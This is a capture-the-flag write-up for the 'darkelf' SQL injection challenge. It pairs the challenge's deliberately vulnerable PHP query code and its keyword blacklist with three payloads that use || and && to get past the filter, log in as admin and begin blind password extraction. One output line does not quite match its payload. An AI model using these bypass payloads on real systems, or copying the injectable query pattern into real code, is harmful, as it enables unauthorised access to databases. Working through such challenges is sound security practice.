```
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect();  
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("darkelf"); 
  highlight_file(__FILE__); 
?>
```
BLACKLIST= OR, AND

PAYLOAD 1: ?pw='||id='admin
OUTPUT: select id from prob_darkelf where id='guest' and pw=''||id='admin'-- -'
Hello admin

PAYLOAD 2: ?pw='|| id='admin'%26%26 length(pw)>0%23
OUTPUT: select id from prob_darkelf where id='guest' and pw=''|| id='admin'&& length(pw)>0#'
Hello Admin
Darkelf clear

PAYLOAD 3: ?pw=%27||id='admin'%26%26%20ascii(substr(pw,1,1))>0%23
OUTPUT: select id from prob_darkelf where id='guest' and pw=''||id='admin'&& ascii(substr(pw,1,1))>0#'
Hello Admin
Darkelf clear

Darkelf clear
